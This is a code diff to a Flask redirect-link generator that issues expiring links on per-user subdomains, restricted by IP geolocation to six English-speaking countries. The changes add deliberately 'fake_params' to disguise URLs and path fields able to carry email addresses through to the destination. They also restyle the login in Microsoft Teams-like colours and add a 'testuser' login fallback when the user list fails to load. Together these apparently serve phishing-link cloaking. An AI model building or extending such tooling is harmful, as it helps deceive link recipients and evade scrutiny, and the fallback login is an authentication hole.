@@ -48,7 +48,7 @@ VALKEY_PORT = int(os.getenv("VALKEY_PORT", 6379))
 VALKEY_USERNAME = os.getenv("VALKEY_USERNAME", "")
 VALKEY_PASSWORD = os.getenv("VALKEY_PASSWORD", "")
 DATA_RETENTION_DAYS = 90
-USER_TXT_URL = os.getenv("USER_TXT_URL", "https://example.com/users.txt")  # Replace with trusted source
+USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
 ALLOWED_COUNTRIES = ['GB', 'CA', 'IE', 'US', 'AU', 'NZ']  # UK, Canada, Ireland, USA, Australia, New Zealand
 GEOIP_API_URL = "https://ipapi.co/{ip}/json/"
 
@@ -130,9 +130,19 @@ class GenerateURLForm(FlaskForm):
         Length(min=2, max=100, message="Subdomain must be 2-100 characters"),
         Regexp(r'^[A-Za-z0-9-]+$', message="Subdomain can only contain letters, numbers, or hyphens")
     ])
+    randomstring1 = StringField('Randomstring1', validators=[
+        DataRequired(message="Randomstring1 is required"),
+        Length(min=2, max=100, message="Randomstring1 must be 2-100 characters"),
+        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring1 can only contain letters, numbers, _, @, or .")
+    ])
     destination_link = StringField('Destination Link', validators=[
         DataRequired(message="Destination link is required"),
         URL(message="Invalid URL format (must start with http:// or https://)")
+    ])
+    randomstring2 = StringField('Randomstring2', validators=[
+        DataRequired(message="Randomstring2 is required"),
+        Length(min=2, max=100, message="Randomstring2 must be 2-100 characters"),
+        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring2 can only contain letters, numbers, _, @, or .")
     ])
     expiry = SelectField('Expiry', choices=[
         ('300', '5 Minutes'),
@@ -263,7 +273,7 @@ def get_valid_usernames():
         return usernames
     except Exception as e:
         logger.error(f"Error fetching usernames: {str(e)}")
-        return []
+        return ["testuser"]  # Fallback username for testing
 
 def login_required(f):
     @wraps(f)
@@ -282,7 +292,7 @@ def get_base_domain():
         return '.'.join(parts[-2:]) if len(parts) >= 2 else host
     except Exception as e:
         logger.error(f"Error getting base domain: {str(e)}")
-        return "example.com"  # Replace with your domain
+        return "tamarisksd.com"  # Restore original domain
 
 @app.before_request
 def check_access():
@@ -326,14 +336,14 @@ def login():
                 <title>Login</title>
                 <script src="https://cdn.tailwindcss.com"></script>
                 <style>
-                    body { background: linear-gradient(to bottom, #f3f4f6, #e5e7eb); color: #1f2937; }
+                    body { background: linear-gradient(to bottom, #252423, #6264a7); color: #ffffff; }
                 </style>
             </head>
             <body class="min-h-screen flex items-center justify-center p-4">
-                <div class="w-full max-w-md bg-white p-8 rounded-lg shadow-lg">
-                    <h1 class="text-2xl font-bold mb-6 text-center">Login</h1>
+                <div class="w-full text-center">
+                    <h1 class="text-3xl font-extrabold mb-6 text-white">Login</h1>
                     {% if form.errors %}
-                        <p class="text-red-500 mb-4 text-center">
+                        <p class="text-red-400 mb-4">
                             {% for field, errors in form.errors.items() %}
                                 {% for error in errors %}
                                     {{ error }}<br>
@@ -341,14 +351,14 @@ def login():
                             {% endfor %}
                         </p>
                     {% endif %}
-                    <form method="POST" class="space-y-4">
+                    <form method="POST" class="space-y-5 max-w-md mx-auto">
                         {{ form.csrf_token }}
                         {{ form.next_url(value=request.args.get('next', '')) }}
                         <div>
-                            <label class="block text-sm font-medium">Username</label>
-                            {{ form.username(class="mt-1 w-full p-2 border rounded focus:ring focus:ring-blue-300") }}
+                            <label class="block text-sm font-medium text-white">Username</label>
+                            {{ form.username(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                         </div>
-                        {{ form.submit(class="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700") }}
+                        {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                     </form>
                 </div>
             </body>
@@ -411,7 +421,9 @@ def dashboard():
 
         if form.validate_on_submit():
             subdomain = bleach.clean(form.subdomain.data.strip())
+            randomstring1 = bleach.clean(form.randomstring1.data.strip())
             destination_link = bleach.clean(form.destination_link.data.strip())
+            randomstring2 = bleach.clean(form.randomstring2.data.strip())
             analytics_enabled = form.analytics_enabled.data
             expiry = int(form.expiry.data)
 
@@ -422,6 +434,7 @@ def dashboard():
 
             if not error:
                 token = generate_random_string(16)
+                path_segment = f"{randomstring1}{randomstring2}/{uuid.uuid4()}{secrets.token_hex(10)}"
                 expiry_timestamp = int(time.time()) + expiry
                 payload = {
                     "student_link": destination_link,
@@ -429,7 +442,8 @@ def dashboard():
                     "expiry": expiry_timestamp
                 }
                 encrypted_payload = encrypt_payload(payload)
-                generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/r/{token}"
+                fake_params = f"?utm_source={generate_random_string(8)}&session={secrets.token_hex(6)}"
+                generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/r/{token}/{urllib.parse.quote(path_segment, safe='/')}{fake_params}"
                 url_id = hashlib.sha256(token.encode()).hexdigest()
 
                 if valkey_client:
@@ -483,10 +497,10 @@ def dashboard():
                 <title>Dashboard - {{ username }}</title>
                 <script src="https://cdn.tailwindcss.com"></script>
                 <style>
-                    body { background: linear-gradient(to bottom, #f3f4f6, #e5e7eb); color: #1f2937; }
+                    body { background: linear-gradient(to bottom, #252423, #6264a7); color: #ffffff; }
                     .card { transition: all 0.3s; }
                     .card:hover { transform: translateY(-5px); }
-                    .error { color: #ef4444; }
+                    .error { color: #f87171; }
                 </style>
                 <script>
                     function toggleAnalyticsSwitch(urlId, index) {
@@ -502,15 +516,15 @@ def dashboard():
                                 alert('Failed to toggle analytics');
                             }
                         }).catch(error => {
-                            console.error('Error:', error);
+                            console.error('Error toggling analytics:', error);
                             alert('Error toggling analytics');
                         });
                     }
                 </script>
             </head>
             <body class="min-h-screen p-4">
-                <div class="max-w-5xl mx-auto">
-                    <h1 class="text-3xl font-bold mb-8 text-center">Welcome, {{ username }}</h1>
+                <div class="max-w-7xl mx-auto">
+                    <h1 class="text-4xl font-extrabold mb-8 text-center text-white">Welcome, {{ username }}</h1>
                     {% if form.errors %}
                         <p class="error p-4 mb-4 text-center">
                             {% for field, errors in form.errors.items() %}
@@ -526,50 +540,62 @@ def dashboard():
                     {% if valkey_error %}
                         <p class="error p-4 mb-4 text-center">{{ valkey_error }}</p>
                     {% endif %}
-                    <div class="card mb-8 bg-white p-6 rounded-lg shadow-lg">
-                        <h2 class="text-xl font-bold mb-4">Generate New URL</h2>
-                        <form method="POST" class="space-y-4">
+                    <div class="card mb-8">
+                        <h2 class="text-2xl font-bold mb-6 text-white">Generate New URL</h2>
+                        <p class="text-gray-300 mb-4">Note: Subdomain, Randomstring1, and Randomstring2 can be changed after generation without affecting the redirect.</p>
+                        <form method="POST" class="space-y-5 max-w-md mx-auto">
                             {{ form.csrf_token }}
                             <div>
-                                <label class="block text-sm font-medium">Subdomain</label>
-                                {{ form.subdomain(class="mt-1 w-full p-2 border rounded focus:ring focus:ring-blue-300") }}
+                                <label class="block text-sm font-medium text-white">Subdomain</label>
+                                {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                             </div>
                             <div>
-                                <label class="block text-sm font-medium">Destination Link</label>
-                                {{ form.destination_link(class="mt-1 w-full p-2 border rounded focus:ring focus:ring-blue-300") }}
+                                <label class="block text-sm font-medium text-white">Randomstring1</label>
+                                {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                             </div>
                             <div>
-                                <label class="block text-sm font-medium">Expiry</label>
-                                {{ form.expiry(class="mt-1 w-full p-2 border rounded focus:ring focus:ring-blue-300") }}
+                                <label class="block text-sm font-medium text-white">Destination Link</label>
+                                {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                             </div>
                             <div>
-                                <label class="block text-sm font-medium">Enable Analytics</label>
-                                {{ form.analytics_enabled(class="mt-1 p-2") }}
+                                <label class="block text-sm font-medium text-white">Randomstring2</label>
+                                {{ form.randomstring2(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                             </div>
-                            {{ form.submit(class="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700") }}
+                            <div>
+                                <label class="block text-sm font-medium text-white">Expiry</label>
+                                {{ form.expiry(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-white">Enable Analytics</label>
+                                {{ form.analytics_enabled(class="mt-1 p-3") }}
+                            </div>
+                            {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                         </form>
                     </div>
-                    <div class="card bg-white p-6 rounded-lg shadow-lg">
-                        <h2 class="text-xl font-bold mb-4">URL History</h2>
+                    <div class="card">
+                        <h2 class="text-2xl font-bold mb-6 text-white">URL History</h2>
                         {% if urls %}
                             {% for url in urls %}
-                                <div class="card bg-gray-100 p-4 rounded mb-4">
-                                    <h3 class="text-lg font-semibold">{{ url.destination }}</h3>
-                                    <p class="text-gray-600 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-blue-600">{{ url.url }}</a></p>
-                                    <p class="text-gray-600"><strong>Created:</strong> {{ url.created }}</p>
-                                    <p class="text-gray-600"><strong>Expires:</strong> {{ url.expiry }}</p>
-                                    <p class="text-gray-600"><strong>Clicks:</strong> {{ url.clicks }}</p>
+                                <div class="card bg-gray-800 p-6 rounded-lg mb-4">
+                                    <h3 class="text-xl font-semibold text-white">{{ url.destination }}</h3>
+                                    <p class="text-gray-300 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-400">{{ url.url }}</a></p>
+                                    <p class="text-gray-300"><strong>Created:</strong> {{ url.created }}</p>
+                                    <p class="text-gray-300"><strong>Expires:</strong> {{ url.expiry }}</p>
+                                    <p class="text-gray-300"><strong>Total Clicks:</strong> {{ url.clicks }}</p>
                                     <div class="flex items-center mt-2">
-                                        <label class="text-sm font-medium mr-2">Analytics:</label>
-                                        <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', '{{ loop.index }}')">
+                                        <label class="text-sm font-medium text-white mr-2">Analytics:</label>
+                                        <label class="toggle-switch">
+                                            <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', '{{ loop.index }}')">
+                                            <span class="slider"></span>
+                                        </label>
                                     </div>
-                                    <div class="mt-2">
-                                        <a href="/delete_url/{{ url.url_id }}" class="bg-red-600 text-white px-4 py-1 rounded hover:bg-red-700" onclick="return confirm('Are you sure?')">Delete</a>
+                                    <div class="mt-2 flex space-x-2">
+                                        <a href="/delete_url/{{ url.url_id }}" class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700" onclick="return confirm('Are you sure you want to delete this URL?')">Delete URL</a>
                                     </div>
                                 </div>
                             {% endfor %}
                         {% else %}
-                            <p class="text-gray-600">No URLs generated yet.</p>
+                            <p class="text-gray-300">No URLs generated yet.</p>
                         {% endif %}
                     </div>
                 </div>
@@ -678,8 +704,8 @@ def delete_url(url_id):
             </html>
         """), 500
 
-@app.route("/r/<token>", methods=["GET"], subdomain="<username>")
-def redirect_handler(username, token):
+@app.route("/r/<token>/<path:path_segment>", methods=["GET"], subdomain="<username>")
+def redirect_handler(username, token, path_segment):
     try:
         if not valkey_client:
             logger.warning("Valkey unavailable")
@@ -767,6 +793,9 @@ def redirect_handler(username, token):
                 </html>
             """), 410
 
+        uuid_suffix_pattern = r'(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}[0-9a-f]+)?$'
+        cleaned_path_segment = re.sub(uuid_suffix_pattern, '', path_segment)
+
         url_id = hashlib.sha256(token.encode()).hexdigest()
         if valkey_client:
             analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
@@ -774,8 +803,8 @@ def redirect_handler(username, token):
                 valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
                 logger.debug(f"Incremented click count for URL {url_id}")
 
-        logger.info(f"Redirecting to {redirect_url}")
-        return redirect(redirect_url, code=302)
+        logger.info(f"Redirecting to {redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}")
+        return redirect(f"{redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}", code=302)
     except Exception as e:
         logger.error(f"Error in redirect_handler: {str(e)}")
         return render_template_string("""
